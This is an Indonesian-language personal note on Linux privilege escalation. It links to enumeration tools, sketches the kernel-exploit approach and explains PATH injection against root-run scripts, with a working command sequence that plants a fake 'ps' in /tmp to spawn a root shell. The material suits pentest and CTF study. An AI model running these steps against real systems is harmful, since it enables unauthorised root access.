# Usefool Tools and links
Cek Priv Esc
https://github.com/sleventyeleven/linuxprivchecker

Kalau stuck bisa kesini
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

# Kernel Exploit
Intinya nyari apakah versi kernel vuln. Cara ceknya
`uname -a`
Terus cari exploitnya -> Compile -> Run -> Boom

# Checklist
![[linux_privesc.jpg]]

12. LD_PRELOAD
13. PATH INJECTION

# Path Injection
Path injection terjadi karena pemanggilan binary dengan akses root yang tidak menggunakan full path. Contoh pemangilan yang benar
```
/usr/local/bin/nmap -sV 192.168.1.1
```

Contoh pemanggilan yang salah
```
nmap -sV 192.168.1.1
```
Kenapa kok bisa salah? karena hal ini bisa menjadi celah PATH injection. 

Linux menggunakan PATH untuk memanggil aplikasi tanpa menulis full path. Sama seperti Environment variable di windows. Namun ketika aplikasi ini dipanggil tanpa full path dengan akses root, maka kita bisa melakukan injection agar aplikasi yang dipanggil pertama kali di eksekusi pada direktori yang kita inginkan. 

```
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell
whoami
```

Ya jadi contohnya diatas, kita menambahkan $PATH direktori `/tmp` dimana diletakkan di awal, sehingga aplikasi yang tanpa full path tadi akan mencari pertama kali ke folder `tmp`



